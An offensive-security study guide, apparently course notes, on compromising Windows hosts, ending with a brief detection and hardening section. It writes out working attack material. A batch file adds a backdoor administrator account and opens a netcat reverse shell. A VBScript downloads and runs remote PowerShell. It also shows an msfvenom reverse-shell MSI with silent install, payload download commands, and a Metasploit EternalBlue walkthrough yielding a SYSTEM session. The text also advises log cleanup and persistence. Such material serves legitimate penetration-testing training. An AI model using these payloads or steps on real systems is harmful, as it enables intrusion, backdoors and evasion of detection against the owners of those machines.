# Infiltrating Windows

## Overview

Microsoft has dominated home and enterprise computing markets for decades. With improved Active Directory features, cloud service integration, Windows Subsystem for Linux (WSL), and expanding interconnectivity, the Windows attack surface has grown significantly.

### Windows Vulnerability Landscape

In the last five years alone, **3,688 vulnerabilities** have been reported in Microsoft products, with this number growing daily. Understanding these vulnerabilities and exploitation techniques is crucial for both offensive and defensive security.

## Prominent Windows Exploits

### Critical Historical Vulnerabilities

| Vulnerability | CVE/MS Bulletin | Description |
|---------------|----------------|-------------|
| **MS08-067** | MS08-067 | Critical SMB flaw affecting multiple Windows versions. Used by Conficker worm and Stuxnet. Extremely easy to exploit. |
| **EternalBlue** | MS17-010 | NSA exploit leaked by Shadow Brokers. Used in WannaCry and NotPetya attacks. SMBv1 protocol flaw allowing code execution. |
| **PrintNightmare** | CVE-2021-1675 | Windows Print Spooler RCE. Install malicious printer driver with valid credentials for SYSTEM access. |
| **BlueKeep** | CVE-2019-0708 | RDP protocol vulnerability allowing RCE. Affects Windows 2000 to Server 2008 R2. |
| **Sigred** | CVE-2020-1350 | DNS SIG resource record flaw. Can grant Domain Admin privileges by targeting DNS server/Domain Controller. |
| **SeriousSam** | CVE-2021-36934 | Windows permission issue on C:\Windows\system32\config folder. Non-elevated users can access SAM database via shadow copies. |
| **Zerologon** | CVE-2020-1472 | Critical AD Netlogon Remote Protocol cryptographic flaw. Allows password reset with ~256 guesses in seconds. |

## Enumerating Windows & Fingerprinting Methods

### Time To Live (TTL) Analysis

**Windows TTL Values:**
- Typical responses: **32** or **128**
- Most common: **128**
- Values may vary due to network hops (rarely >20 hops away)

**Example ping output:**
```bash
ping 192.168.86.39
PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms
```

### OS Detection with Nmap

**Basic OS detection:**
```bash
sudo nmap -v -O 192.168.86.39
```

**Enhanced detection (if basic fails):**
```bash
sudo nmap -A -Pn 192.168.86.39
```

**Sample Output Analysis:**
```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh

Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
```

**Key Windows Indicators:**
- **Port 135**: MS-RPC
- **Port 139**: NetBIOS Session Service
- **Port 445**: Microsoft Directory Services (SMB)
- **OS CPE**: `cpe:/o:microsoft:windows_*`

### Banner Grabbing

**Using Nmap banner script:**
```bash
sudo nmap -v 192.168.86.39 --script banner.nse
```

**Sample banner output:**
```
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
```

## Windows File Types & Payload Options

### Dynamic Linking Libraries (DLLs)

**Purpose:**
- Shared code and data libraries
- Used by multiple programs simultaneously
- Modular and updatable

**Attack Vectors:**
- **DLL Injection**: Inject malicious DLL into running process
- **DLL Hijacking**: Replace legitimate DLL with malicious version
- **Privilege Escalation**: Elevate to SYSTEM level
- **UAC Bypass**: Circumvent User Account Controls

**Common DLL Injection Techniques:**
- Process hollowing
- Reflective DLL loading
- Manual DLL mapping
- Thread execution hijacking

### Batch Files (.bat)

**Characteristics:**
- Text-based DOS scripts
- Executed by command-line interpreter
- Automated task execution
- System administrator utilities

**Use Cases:**
- Port opening/closing
- Reverse shell connections
- System enumeration
- Automated command execution

**Example batch payload:**
```batch
@echo off
net user backdoor password123 /add
net localgroup administrators backdoor /add
nc.exe -e cmd.exe 10.10.14.15 4444
```

### VBScript (.vbs)

**Background:**
- Lightweight scripting language
- Based on Microsoft Visual Basic
- Client-side web scripting (largely deprecated)
- Still used in phishing attacks

**Attack Applications:**
- Macro-enabled document attacks
- Email attachment payloads
- Windows Scripting Host execution
- Social engineering campaigns

**Example VBS payload:**
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -ep bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.15/shell.ps1')"""
```

### MSI Files (.msi)

**Purpose:**
- Windows Installer database files
- Application installation packages
- Component and dependency management

**Attack Applications:**
- Payload delivery via Windows Installer
- Privilege escalation through installer service
- Social engineering (fake software updates)
- Persistence via scheduled installation

**MSFVenom MSI generation:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f msi > malicious_installer.msi
```

**Execution:**
```cmd
msiexec /quiet /qn /i malicious_installer.msi
```

### PowerShell (.ps1)

**Capabilities:**
- Shell environment and scripting language
- .NET Common Language Runtime based
- Object-oriented input/output
- Extensive post-exploitation options

**Attack Applications:**
- Fileless malware delivery
- Memory-only payload execution
- Administrative task automation
- System and network enumeration
- Credential harvesting

**PowerShell execution policies:**
- **Restricted**: Default, no scripts allowed
- **RemoteSigned**: Local scripts allowed, remote require signature
- **Unrestricted**: All scripts allowed
- **Bypass**: No policy enforcement

## Tools, Tactics, and Procedures

### Payload Generation Resources

| Resource | Description | Use Case |
|----------|-------------|----------|
| **MSFVenom & Metasploit** | Versatile payload generation and exploitation | Multi-platform payloads, automated exploitation |
| **Payloads All The Things** | Payload generation cheat sheets | Quick reference, one-liners |
| **Mythic C2 Framework** | Alternative C2 framework | Custom payload generation, advanced C2 |
| **Nishang** | Offensive PowerShell framework | PowerShell-based attacks, implants |
| **Darkarmour** | Binary obfuscation tool | AV evasion, obfuscated executables |

### Payload Transfer Methods

#### Impacket

**Key utilities:**
- **psexec**: Remote command execution
- **smbclient**: SMB client interactions
- **wmiexec**: WMI-based execution
- **smbserver**: Stand up SMB server

**Example SMB server:**
```bash
sudo impacket-smbserver share $(pwd) -smb2support
```

#### SMB Shares

**Administrative shares:**
- **C$**: Administrative share to C: drive
- **ADMIN$**: Administrative share to Windows directory
- **IPC$**: Inter-Process Communication share

**Usage for payload transfer:**
```bash
copy payload.exe \\target\C$\temp\
copy payload.exe \\target\ADMIN$\temp\
```

#### HTTP/HTTPS Transfer

**Python web server:**
```bash
python3 -m http.server 80
```

**PowerShell download:**
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.15/payload.exe', 'C:\temp\payload.exe')
```

#### Other Protocols

- **FTP**: File Transfer Protocol
- **TFTP**: Trivial File Transfer Protocol
- **SCP**: Secure Copy Protocol
- **BITS**: Background Intelligent Transfer Service

## Example Compromise Walkthrough

### Step 1: Host Enumeration

**Comprehensive Nmap scan:**
```bash
nmap -v -A 10.129.201.97
```

**Sample results:**
```
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
```

### Step 2: Vulnerability Assessment

**EternalBlue detection:**
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.129.201.97
run
```

**Expected output:**
```
[+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
```

### Step 3: Exploit Selection

**Search for EternalBlue exploits:**
```bash
search eternal
```

**Available options:**
```
0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14  average  Yes
1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14  average  No
2  exploit/windows/smb/ms17_010_psexec            2017-03-14  normal   Yes
```

### Step 4: Exploit Configuration

**Select psexec variant:**
```bash
use exploit/windows/smb/ms17_010_psexec
```

**Configure required options:**
```bash
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set LPORT 4444
show options
```

### Step 5: Execution

**Launch exploit:**
```bash
exploit
```

**Successful exploitation:**
```
[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215)

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## CMD vs PowerShell Comparison

### Command Prompt (CMD)

**Characteristics:**
- Original MS-DOS shell
- Text-based input/output
- Basic automation with batch files
- No command history retention
- No execution policy restrictions

**When to use CMD:**
- Older hosts (Windows XP and earlier)
- Simple interactions and basic tasks
- Batch files and net commands
- MS-DOS native tools
- Stealth operations (less logging)
- Execution policy concerns

**Common CMD commands:**
```cmd
dir                    # List directory contents
cd                     # Change directory
type                   # Display file contents
copy                   # Copy files
net user               # User management
net share              # Share management
tasklist               # List running processes
systeminfo             # System information
ipconfig               # Network configuration
```

### PowerShell

**Characteristics:**
- Advanced shell and scripting environment
- .NET object-based input/output
- Extensive cmdlet library
- Command history and transcription
- Execution policy enforcement
- Module and snap-in support

**When to use PowerShell:**
- Modern Windows systems
- Cmdlet and custom script execution
- .NET object manipulation
- Cloud service interactions
- Advanced automation
- Alias usage
- When stealth is less important

**Common PowerShell cmdlets:**
```powershell
Get-ChildItem          # List directory (ls equivalent)
Set-Location           # Change directory (cd equivalent)
Get-Content            # Read file contents (cat equivalent)
Copy-Item              # Copy files
Get-Process            # List processes (ps equivalent)
Get-Service            # List services
Get-WmiObject          # WMI queries
Invoke-WebRequest      # Web requests (wget/curl equivalent)
Get-ComputerInfo       # System information
```

### Shell Identification

**CMD Prompt:**
```
C:\Windows\system32>
```

**PowerShell Prompt:**
```
PS C:\Windows\system32>
```

**Drop to system shell from Meterpreter:**
```bash
meterpreter > shell
Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Advanced Windows Attack Vectors

### Windows Subsystem for Linux (WSL)

**Security Implications:**
- Virtual Linux environment within Windows
- Potential blind spot for security tools
- Network requests bypass Windows Firewall
- Limited Windows Defender visibility
- Novel attack vector for malware

**Attack Applications:**
- Python3 and Linux binary execution
- Payload download and installation
- Cross-platform script execution
- Firewall and AV evasion

### PowerShell Core on Linux

**Characteristics:**
- Cross-platform PowerShell implementation
- Maintains many Windows PowerShell functions
- Potential AV and EDR evasion
- Novel attack vector

**Security Considerations:**
- Less monitored than traditional PowerShell
- Cross-platform payload delivery
- Hybrid attack scenarios

## Best Practices for Windows Exploitation

### Reconnaissance

1. **Multiple fingerprinting methods**
   - TTL analysis
   - Port scanning
   - Banner grabbing
   - OS detection

2. **Service enumeration**
   - SMB version detection
   - Web server identification
   - Available shares enumeration
   - User enumeration

3. **Vulnerability assessment**
   - Known exploit checking
   - Patch level analysis
   - Configuration weaknesses

### Payload Selection

1. **Target environment analysis**
   - Windows version and architecture
   - Available shells (CMD vs PowerShell)
   - Security controls (AV, firewall)
   - Network restrictions

2. **Delivery method planning**
   - Social engineering vectors
   - Network-based exploitation
   - Physical access scenarios
   - Privilege level requirements

### Operational Security

1. **Stealth considerations**
   - Log generation awareness
   - Process visibility
   - Network traffic patterns
   - Persistence mechanisms

2. **Cleanup procedures**
   - Artifact removal
   - Log cleanup
   - Process termination
   - Connection closure

### Post-Exploitation

1. **Initial access stabilization**
   - Process migration
   - Persistence establishment
   - Backup access creation
   - Privilege escalation

2. **Information gathering**
   - System enumeration
   - User enumeration
   - Network discovery
   - Credential harvesting

## Common Windows Exploitation Patterns

### SMB-Based Attacks

**EternalBlue (MS17-010):**
- Target: SMBv1 protocol
- Impact: Remote code execution
- Affected: Windows 2000 to Server 2016

**SMB Relay Attacks:**
- Capture and relay NTLM authentication
- Target systems without SMB signing
- Privilege escalation opportunities

### RDP-Based Attacks

**BlueKeep (CVE-2019-0708):**
- Target: RDP protocol
- Impact: Remote code execution
- Affected: Windows 2000 to Server 2008 R2

**RDP Credential Attacks:**
- Brute force attacks
- Credential stuffing
- Pass-the-hash attacks

### Web-Based Attacks

**IIS Vulnerabilities:**
- Directory traversal
- Buffer overflows
- Authentication bypasses

**ASP.NET Exploitation:**
- ViewState manipulation
- Deserialization attacks
- File upload vulnerabilities

## Detection and Defense

### Common Detection Methods

**Network-Level:**
- Unusual SMB traffic patterns
- Multiple authentication failures
- Suspicious RDP connections
- Known exploit signatures

**Host-Level:**
- Process creation monitoring
- PowerShell execution logging
- File system modifications
- Registry changes

### Defensive Strategies

**Patch Management:**
- Regular security updates
- Critical vulnerability prioritization
- Testing and deployment procedures

**Network Segmentation:**
- DMZ implementation
- VLAN separation
- Firewall rules
- Access control lists

**Monitoring and Logging:**
- SIEM deployment
- PowerShell script block logging
- Process creation logging
- Network traffic analysis

### Hardening Measures

**System Configuration:**
- Disable unnecessary services
- Remove unused protocols
- Implement principle of least privilege
- Enable security features

**PowerShell Hardening:**
- Constrained Language Mode
- Execution policy enforcement
- Script block logging
- Module logging

## Conclusion

Windows systems present a rich attack surface with numerous exploitation vectors. Success requires:

- **Thorough enumeration** to identify target characteristics
- **Vulnerability assessment** to find exploitation opportunities  
- **Appropriate payload selection** based on target environment
- **Careful operational security** to avoid detection
- **Understanding of both CMD and PowerShell** environments
- **Awareness of modern attack vectors** like WSL and PowerShell Core

The key to successful Windows exploitation lies in understanding the target environment, selecting appropriate tools and techniques, and maintaining operational security throughout the engagement. Regular practice with different Windows versions and security configurations will improve proficiency and success rates. 